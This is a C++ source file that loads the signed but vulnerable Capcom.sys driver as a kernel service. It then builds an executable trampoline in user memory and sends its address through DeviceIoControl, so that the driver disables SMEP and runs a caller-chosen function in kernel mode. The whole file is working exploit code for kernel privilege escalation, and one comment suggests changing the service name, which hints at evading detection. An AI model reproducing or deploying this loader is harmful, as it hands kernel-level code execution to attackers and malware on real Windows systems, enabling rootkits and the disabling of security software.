#include "stdafx.h"
#include "DriverLoader.h"

DriverLoader::DriverLoader()
{
	// Initialize any class variables
}

/// Returns the location of the driver relative to the current directory
wstring DriverLoader::GetCapcomDriverPath()
{
	wstring curdir(MAX_PATH, '\0');
	wstring drvPath(MAX_PATH, '\0');

	GetModuleFileName(NULL, &curdir[0], MAX_PATH);
	
	PathRemoveFileSpec(&curdir[0]);

	PathCombine(&drvPath[0], &curdir[0], L"Capcom.sys");

	return drvPath;
}

// https://github.com/iceb0y/ntdrvldr/blob/master/main.c
VOID PrintErrorAndExit(
	wchar_t *Function,
	ULONG dwErrorCode
	)
{
	LPWSTR Buffer;

	FormatMessageW(FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dwErrorCode,
		LANG_USER_DEFAULT,
		(LPWSTR)&Buffer,
		0,
		NULL);
	fwprintf(stderr, L"%s: %ws", Function, Buffer);
	getchar();
	exit(dwErrorCode);
}



/// Creates a service and loads Capcom.sys into the kernel.
/// When the driver is loaded, a device is exposed named '\\.\Htsysm72FB'
/// You can see this device in WinObj to ensure the module has loaded.
void DriverLoader::LoadCapcomService()
{
	wstring drvLoc = this->GetCapcomDriverPath();
	if (!PathFileExists(&drvLoc[0]))
	{
		printf("Capcom.sys driver not present in current directory\n");
		exit(-1);
	}

	SC_HANDLE hSCManager;
	SC_HANDLE hService;

	// Open Service Control Manager handle. We must create a service for the driver in order for the OS to load it.
	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
	if (!hSCManager) PrintErrorAndExit(L"OpenSCManager", GetLastError());

	// Create the service. NOTE: You should probably change this name :)
	hService = CreateService(hSCManager, SERVICE_NAME, SERVICE_NAME, SERVICE_START | DELETE | SERVICE_STOP, \
		SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, &drvLoc[0], NULL, NULL, NULL, NULL, NULL);

	// If the service already exists on the system, simply use that service instead
	if (!hService)
	{
		hService = OpenService(hSCManager, SERVICE_NAME, SERVICE_START | DELETE | SERVICE_STOP);
	}

	if (!hService) PrintErrorAndExit(L"OpenService", GetLastError());

	// Start the service. This just ensures that Capcom.sys module is loaded.
	StartServiceW(hService, 0, NULL);

	CloseServiceHandle(hService);

	CloseServiceHandle(hSCManager);
}

PPAYLOADTRAMP DriverLoader::AllocPayloadTrampoline(CAPCOM_USER_FUNC targetFunc)
{
	// Allocate executable page for payload
	auto payload = reinterpret_cast<PTRAMPPAGE>(VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE));
	if (!payload) PrintErrorAndExit(L"VirtualAlloc", GetLastError());

	payload->TrampAddr = &payload->TrampData;

	// sti; jmp qword [PayloadAddr]
	payload->TrampData = {
		{0xFB, 0xFF, 0x25, 0x00, 0x00, 0x00, 0x00}, // sti; jmp qword [rip+7]
		targetFunc,
	};

	return &payload->TrampData;
}

void DriverLoader::ExecIoCtlWithTrampoline(CAPCOM_USER_FUNC targetFunc)
{
	// For passing to DeviceIoControl. The driver doesn't do anything with these.
	DWORD dummyOutBuf, dummyBytesReturned;

	// VirtualAlloc a trampoline payload
	PPAYLOADTRAMP payload = AllocPayloadTrampoline(targetFunc);

	// At this point, the service has started and the device should be loaded
	auto hCapcomDevice = CreateFile(CAPCOM_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hCapcomDevice == INVALID_HANDLE_VALUE) PrintErrorAndExit(L"CreateFile", GetLastError());

	// Trigger the payload by sending the address of the payload as InBuf. The driver will then disable SMEP and then execute our payload trampoline
	// which will jump to the function specified during the creation of the payload.
	auto bRes = DeviceIoControl(hCapcomDevice, CAPCOM_DEVICE_IOCTL64, reinterpret_cast<LPVOID>(&payload), 8, &dummyOutBuf, 4, &dummyBytesReturned, nullptr);
	if (!bRes) PrintErrorAndExit(L"DeviceIoControl", GetLastError());
}
